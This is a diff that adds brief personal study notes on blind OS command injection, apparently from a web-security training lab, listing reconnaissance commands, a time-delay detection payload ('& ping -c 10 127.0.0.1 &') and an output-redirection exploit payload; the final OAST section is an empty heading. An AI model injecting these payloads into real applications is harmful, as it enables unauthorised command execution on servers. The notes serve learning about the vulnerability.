@@ -1,0 +1,21 @@
+1. Usefull Command
+
+- Name of Current user : whoami (linux/windows)
+- Operating System : uname -a (linux) | ver (windows)
+- Network Information : ifconfig (linux) | ipconfig "or" ipconfig /all (windows)
+- Network Connections : netstat -an (linux/windows)
+- Running Processes : ps -ef (linux) | tasklist (windows)
+
+2. Blind OS Command Injection Vuln (mail)
+ - mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+
+3. Detecting Blind OS Comand Injection using time delays
+- & ping -c 10 127.0.0.1 &
+    -> 10 = ping with time and this using "Seconds"
+
+4. Expolit Blind OS Command Injection
+- & whoami > /var/www/static/whoami.txt
+-> Ex : You can then use the browser to fetch https://vulnerable-website.com/whoami.txt
+
+5. OAST Technique
+
